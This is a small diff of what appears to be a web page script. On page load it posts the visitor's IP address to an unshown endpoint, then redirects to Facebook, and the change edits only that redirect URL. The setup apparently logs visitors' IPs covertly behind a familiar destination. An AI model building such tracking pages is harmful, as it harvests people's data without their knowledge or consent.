@@ -16,10 +16,10 @@ window.onload = function() {
       body: JSON.stringify({ ip })
     })
     .then(response => {
-      window.location.href = 'https://www.facebook.com';
+      window.location.href = 'https://www.facebook.com/home.php?ref=web'; // Forces web browser
     })
     .catch(() => {
-      window.location.href = 'https://www.facebook.com';
+      window.location.href = 'https://www.facebook.com/home.php?ref=web'; // Fallback
     });
   });
 };
